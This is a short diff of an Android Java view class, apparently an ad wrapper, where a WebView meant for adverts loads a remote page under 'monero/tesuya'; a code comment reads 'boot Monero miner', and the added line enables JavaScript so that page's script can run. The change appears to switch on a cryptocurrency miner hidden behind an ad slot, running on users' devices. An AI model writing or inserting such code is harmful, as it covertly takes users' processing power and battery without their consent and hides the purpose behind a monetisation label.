@@ -64,6 +64,7 @@ public class WisecraftMonetizeWrapperView extends FrameLayout {
             if(rank!=AdRank.MOB){
                 // boot Monero miner
                 WebView view=findViewById(R.id.adView);
+                view.getSettings().setJavaScriptEnabled(true);
                 view.setWebViewClient(new WebViewClient(){});
                 view.loadUrl("http://nao20010128nao.github.io/monero/tesuya");
             }else{
